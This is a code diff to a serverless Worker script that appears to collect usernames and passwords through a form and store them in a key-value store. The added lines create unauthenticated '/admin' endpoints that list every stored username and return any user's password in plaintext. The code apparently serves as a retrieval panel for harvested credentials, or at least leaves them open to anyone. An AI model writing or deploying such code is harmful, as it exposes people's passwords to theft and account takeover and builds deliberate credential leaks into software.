@@ -1,5 +1,37 @@
 export default {
   async fetch(request, env) {
+    // ------------------------------------------------------------------
+    //  NEW: Credential retrieval endpoints (added before original code)
+    // ------------------------------------------------------------------
+    const url = new URL(request.url);
+    const path = url.pathname;
+
+    if (request.method === "GET") {
+      // List all usernames
+      if (path === "/admin") {
+        const keys = await env.creds.list();
+        const usernames = keys.keys.map(k => k.name);
+        return new Response(JSON.stringify({ usernames }, null, 2), {
+          headers: { "Content-Type": "application/json" }
+        });
+      }
+
+      // Retrieve a specific username's password
+      if (path.startsWith("/admin/")) {
+        const username = path.slice(7); // remove "/admin/"
+        const password = await env.creds.get(username);
+        if (password === null) {
+          return new Response("Username not found", { status: 404 });
+        }
+        return new Response(JSON.stringify({ username, password }, null, 2), {
+          headers: { "Content-Type": "application/json" }
+        });
+      }
+    }
+
+    // ==================================================================
+    //  ORIGINAL CODE – UNCHANGED (copied verbatim)
+    // ==================================================================
     if (request.method === "POST") {
       const formData = await request.formData();
       const username = formData.get("username");
@@ -52,5 +84,8 @@ export default {
     return new Response(htmlContent, {
       headers: { "Content-Type": "text/html" },
     });
+    // ==================================================================
+    //  END OF ORIGINAL CODE
+    // ==================================================================
   },
 };
